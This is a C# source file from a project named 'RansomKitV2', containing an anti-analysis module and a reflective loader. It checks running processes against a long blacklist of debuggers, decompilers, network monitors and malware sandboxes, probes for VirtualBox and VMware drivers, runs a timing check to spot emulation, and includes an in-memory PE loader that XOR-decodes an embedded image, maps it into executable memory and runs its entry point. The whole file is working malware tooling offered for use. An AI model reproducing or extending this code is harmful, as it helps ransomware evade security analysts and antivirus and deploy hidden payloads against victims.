using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace RansomKitV2
{
    internal static class AntiCrackEngine
    {
        private static readonly HashSet<string> Blacklist = new(StringComparer.OrdinalIgnoreCase)
        {
            "dnspy","dnspy-x86","dnspy-x64","ilspy","ilspycmd","dotpeek","reflector",
            "x64dbg","x32dbg","ollydbg","windbg","ida64","ida32","ida","ghidra","radare2","r2",
            "cheatengine","cheatengine-x86_64","cheatengine-i386",
            "processhacker","procmon","procexp","processexplorer","systeminformer",
            "scylla","scylla_x64","scylla_x86","lordpe","pe-bear","pebear","cffexplorer",
            "pestudio","exeinfope","hxd","010editor","hexeditor",
            "fiddler","wireshark","mitmproxy","httpdebugger",
            "apimonitor","api-monitor","rohitab","winspy","spyxx",
            "regmon","filemon","tcpview","autoruns",
            "frida","frida-server","xposed","lsposed",
            "simpleassemblyexplorer","justdecompile","ildasm","monodis",
            "wpe","proxifier","charles","burpsuite",
            "sandboxie","cuckoo","anyrun","joesandbox",
            "pestudio64","die","signaturechecker",
            "glasswire","netlimiter","smsniff","rawcap",
            "ollyice","immdbg","immunitydebugger","idaq","idaq64",
            "babylon","hiew","reclass","reclass.net",
            "pin","vtune","perfview","apiscout","apispy",
            "injector","extremeinjector","sinjector","manualmapinjector",
        };

        private static readonly string[] VmProbes =
        {
            @"C:\Windows\System32\drivers\VBoxMouse.sys",
            @"C:\Windows\System32\drivers\VBoxGuest.sys",
            @"C:\Windows\System32\drivers\vmhgfs.sys",
            @"C:\Windows\System32\drivers\vmmouse.sys",
            @"C:\Windows\System32\drivers\vm3dmp.sys",
            @"C:\Windows\System32\drivers\VBoxSF.sys",
        };

        public static bool IsMaliciousProcessPresent()
        {
            try
            {
                foreach (var proc in Process.GetProcesses())
                {
                    try
                    {
                        if (Blacklist.Contains(proc.ProcessName)) return true;
                    }
                    catch { }
                }
            }
            catch { }
            return false;
        }

        public static bool IsTimingSuspicious()
        {
            try
            {
                foreach (var p in VmProbes) if (File.Exists(p)) return true;

                var sw = Stopwatch.StartNew();
                long acc = 0;
                for (int i = 0; i < 500_000; i++) acc += i ^ (i << 1);
                sw.Stop();
                GC.KeepAlive(acc);

                return sw.ElapsedMilliseconds > 150;
            }
            catch { return false; }
        }

        // ---------- In-memory PE loader ----------
        public static IntPtr LoadLibraryFromMemory(byte[] image, byte[] xorKey)
        {
            byte[] pe = XorDecode(image, xorKey);
            unsafe
            {
                fixed (byte* basePtr = pe)
                {
                    var dos = (IMAGE_DOS_HEADER*)basePtr;
                    if (dos->e_magic != 0x5A4D) return IntPtr.Zero;

                    var nt = (IMAGE_NT_HEADERS64*)(basePtr + dos->e_lfanew);
                    if (nt->Signature != 0x00004550) return IntPtr.Zero;

                    uint imageSize = nt->OptionalHeader.SizeOfImage;
                    IntPtr alloc = VirtualAlloc(IntPtr.Zero, imageSize,
                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    if (alloc == IntPtr.Zero) return IntPtr.Zero;

                    byte* dest = (byte*)alloc;
                    byte* src = basePtr;

                    VirtualProtect((IntPtr)(void*)dest, imageSize, PAGE_EXECUTE_READWRITE, out _);

                    for (uint i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
                        dest[i] = src[i];

                    var sec = (IMAGE_SECTION_HEADER*)((byte*)nt + sizeof(IMAGE_NT_HEADERS64));
                    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
                    {
                        byte* target = dest + sec[i].VirtualAddress;
                        byte* source = src + sec[i].PointerToRawData;
                        for (uint j = 0; j < sec[i].SizeOfRawData; j++)
                            target[j] = source[j];
                    }

                    long delta = (long)alloc - (long)nt->OptionalHeader.ImageBase;
                    if (delta != 0) ApplyRelocations(dest, nt, delta);

                    ResolveImports(dest, nt);

                    uint ep = nt->OptionalHeader.AddressOfEntryPoint;
                    var entry = (delegate* unmanaged[Stdcall]<IntPtr, uint, uint>)(dest + ep);
                    entry(alloc, DLL_PROCESS_ATTACH);

                    return alloc;
                }
            }
        }

        private static byte[] XorDecode(byte[] data, byte[] key)
        {
            var output = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                output[i] = (byte)(data[i] ^ key[i % key.Length]);
            return output;
        }

        private static unsafe void ApplyRelocations(byte* image, IMAGE_NT_HEADERS64* nt, long delta)
        {
            var reloc = (IMAGE_DATA_DIRECTORY*)(&nt->OptionalHeader.DataDirectory[5]);
            if (reloc->Size == 0) return;

            byte* relocBase = image + reloc->VirtualAddress;
            uint consumed = 0;
            while (consumed < reloc->Size)
            {
                var block = (IMAGE_BASE_RELOCATION*)(relocBase + consumed);
                if (block->SizeOfBlock == 0) break;
                int count = (int)((block->SizeOfBlock - 8) / 2);
                ushort* entries = (ushort*)(relocBase + consumed + 8);
                for (int i = 0; i < count; i++)
                {
                    int type = entries[i] >> 12;
                    int offset = entries[i] & 0xFFF;
                    if (type == 10)
                    {
                        ulong* patch = (ulong*)(image + block->VirtualAddress + offset);
                        *patch += (ulong)delta;
                    }
                }
                consumed += block->SizeOfBlock;
            }
        }

        private static unsafe void ResolveImports(byte* image, IMAGE_NT_HEADERS64* nt)
        {
            var imp = (IMAGE_DATA_DIRECTORY*)(&nt->OptionalHeader.DataDirectory[1]);
            if (imp->Size == 0) return;

            var desc = (IMAGE_IMPORT_DESCRIPTOR*)(image + imp->VirtualAddress);
            while (desc->Name != 0)
            {
                byte* namePtr = image + desc->Name;
                string dll = Marshal.PtrToStringAnsi((IntPtr)(void*)namePtr) ?? "";
                IntPtr hMod = LoadLibraryA(dll);
                if (hMod == IntPtr.Zero) { desc++; continue; }

                var thunk = (ulong*)(image +
                    (desc->OriginalFirstThunk != 0 ? desc->OriginalFirstThunk : desc->FirstThunk));
                var iat = (ulong*)(image + desc->FirstThunk);

                while (*thunk != 0)
                {
                    IntPtr addr;
                    if ((*thunk & 0x8000000000000000UL) != 0)
                    {
                        // ordinal import — lower 16 bits, widen through long for IntPtr ctor
                        IntPtr ord = (IntPtr)(long)(*thunk & 0xFFFFUL);
                        addr = GetProcAddress(hMod, ord);
                    }
                    else
                    {
                        byte* fnPtr = image + (int)(*thunk) + 2;
                        string fn = Marshal.PtrToStringAnsi((IntPtr)(void*)fnPtr) ?? "";
                        addr = GetProcAddress(hMod, fn);
                    }
                    *iat = (ulong)addr;
                    thunk++; iat++;
                }
                desc++;
            }
        }

        // ---------- P/Invoke ----------
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint DLL_PROCESS_ATTACH = 1;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr LoadLibraryA(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, IntPtr ordinal);

        // ---------- PE structs ----------
        [StructLayout(LayoutKind.Sequential)]
        private unsafe struct IMAGE_DOS_HEADER
        {
            public ushort e_magic; public ushort e_cblp; public ushort e_cp; public ushort e_crlc;
            public ushort e_cparhdr; public ushort e_minalloc; public ushort e_maxalloc;
            public ushort e_ss; public ushort e_sp; public ushort e_csum; public ushort e_ip;
            public ushort e_cs; public ushort e_lfarlc; public ushort e_ovno;
            public fixed ushort e_res[4]; public ushort e_oemid; public ushort e_oeminfo;
            public fixed ushort e_res2[10]; public int e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_NT_HEADERS64
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_FILE_HEADER
        {
            public ushort Machine; public ushort NumberOfSections;
            public uint TimeDateStamp; public uint PointerToSymbolTable;
            public uint NumberOfSymbols; public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        private unsafe struct IMAGE_OPTIONAL_HEADER64
        {
            public ushort Magic; public byte MajorLinkerVersion; public byte MinorLinkerVersion;
            public uint SizeOfCode; public uint SizeOfInitializedData; public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint; public uint BaseOfCode;
            public ulong ImageBase; public uint SectionAlignment; public uint FileAlignment;
            public ushort MajorOperatingSystemVersion; public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion; public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion; public ushort MinorSubsystemVersion;
            public uint Win32VersionValue; public uint SizeOfImage; public uint SizeOfHeaders;
            public uint CheckSum; public ushort Subsystem; public ushort DllCharacteristics;
            public ulong SizeOfStackReserve; public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve; public ulong SizeOfHeapCommit;
            public uint LoaderFlags; public uint NumberOfRvaAndSizes;
            public fixed ulong DataDirectory[32];
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        private unsafe struct IMAGE_SECTION_HEADER
        {
            public fixed byte Name[8];
            public uint VirtualSize; public uint VirtualAddress;
            public uint SizeOfRawData; public uint PointerToRawData;
            public uint PointerToRelocations; public uint PointerToLinenumbers;
            public ushort NumberOfRelocations; public ushort NumberOfLinenumbers;
            public uint Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAddress;
            public uint SizeOfBlock;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_IMPORT_DESCRIPTOR
        {
            public uint OriginalFirstThunk; public uint TimeDateStamp;
            public uint ForwarderChain; public uint Name; public uint FirstThunk;
        }
    }
}